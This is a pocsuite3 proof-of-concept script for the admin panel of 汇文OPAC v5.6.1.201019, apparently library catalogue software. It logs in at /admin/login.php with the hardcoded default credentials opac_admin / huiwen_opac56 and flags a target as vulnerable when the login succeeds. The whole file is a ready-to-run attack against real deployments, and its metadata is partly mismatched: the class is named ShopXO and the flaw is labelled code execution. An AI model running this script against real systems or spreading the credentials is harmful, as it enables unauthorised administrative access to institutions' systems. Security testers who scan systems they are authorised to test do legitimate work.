# !/usr/bin/env python
# -*- coding: UTF-8 -*-

import re
from urllib.parse import urlparse

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE


class ShopXO_POC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['汇文OPAC v5.6.1.201019 管理默认弱口令']
    vulDate = '2021-03-23'
    createDate = '2021-10-19'
    updateDate = '2021-10-19'
    references = ['']
    name = '汇文OPAC v5.6.1.201019 管理默认弱口令'
    appPowerLink = ''
    appName = '汇文OPAC'
    appVersion = 'v5.6.1.201019'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''汇文OPAC v5.6.1.201019 管理默认弱口令'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        target = self.url
        if target:
            try:
                self.timeout = 5
                vulurl = target + "/admin/login.php"
                # 获取hostname
                parse = urlparse(vulurl)
                headers = {
                    "Host": "{}".format(parse.netloc),
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                data = "username=opac_admin&passwd=huiwen_opac56"
                try:
                    resq = requests.post(vulurl, headers=headers, timeout=self.timeout, data=data,verify=False)
                except Exception:
                    return False
                else:
                    if resq.status_code == 200:
                        if "用户名或者密码错误" not in resq.text and "汇文OPAC" in resq.text:
                            result['VerifyInfo'] = {}
                            result['VerifyInfo']['URL'] = vulurl
                            result['VerifyInfo']['payload'] = data
            except Exception as e:
                print(e)

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(ShopXO_POC)
